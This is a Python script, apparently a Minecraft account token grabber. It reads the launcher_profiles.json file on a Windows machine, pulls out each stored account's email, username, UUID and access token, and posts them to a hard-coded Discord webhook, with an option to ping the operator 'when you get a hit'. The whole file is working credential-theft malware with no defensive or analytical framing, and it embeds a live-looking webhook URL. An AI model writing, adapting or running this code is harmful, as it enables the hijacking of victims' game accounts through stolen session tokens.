import json
import os
from urllib.request import Request, urlopen

# your webhook URL
WEBHOOK_URL = "https://discord.com/api/webhooks/1315178020667002911/lRhIBeKywYTcsGc6Hjcg5uTCxfjYDRQ_wLAI_zWn0kPL7qfINmD748EfU4XmIlwWPBwo"

# mentions you when you get a hit
PING_ME = False

def uuid_dashed(uuid):
    """Format UUID to include dashes."""
    return f"{uuid[0:8]}-{uuid[8:12]}-{uuid[12:16]}-{uuid[16:21]}-{uuid[21:32]}"

def main():
    # Get the path to the launcher_profiles.json file
    app_data_path = os.getenv("APPDATA")
    if not app_data_path:
        print("APPDATA environment variable is not set.")
        return
    
    profiles_path = os.path.join(app_data_path, ".minecraft", "launcher_profiles.json")
    
    if not os.path.exists(profiles_path):
        print(f"File not found: {profiles_path}")
        return

    try:
        # Load authentication database from launcher_profiles.json
        with open(profiles_path, "r") as f:
            auth_db = json.load(f)["authenticationDatabase"]
    except Exception as e:
        print(f"Error reading the profiles file: {e}")
        return

    embeds = []

    # Process each user in the authentication database
    for x in auth_db:
        try:
            email = auth_db[x].get("username")
            uuid, display_name_object = list(auth_db[x]["profiles"].items())[0]
            embed = {
                "fields": [
                    {"name": "Email", "value": email if email and "@" in email else "N/A", "inline": False},
                    {"name": "Username", "value": display_name_object["displayName"].replace("_", "\\_"), "inline": True},
                    {"name": "UUID", "value": uuid_dashed(uuid), "inline": True},
                    {"name": "Token", "value": auth_db[x]["accessToken"], "inline": True}
                ]
            }
            embeds.append(embed)
        except KeyError as e:
            print(f"Error processing user {x}: Missing key {e}")
        except Exception as e:
            print(f"Error processing user {x}: {e}")

    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"
    }

    # Prepare payload for the webhook
    payload = json.dumps({"embeds": embeds, "content": "@everyone" if PING_ME else ""})
    
    try:
        # Send the request to the Discord webhook
        req = Request(WEBHOOK_URL, data=payload.encode(), headers=headers)
        urlopen(req)
        print("Webhook sent successfully.")
    except Exception as e:
        print(f"Error sending webhook: {e}")

if __name__ == "__main__":
    main()
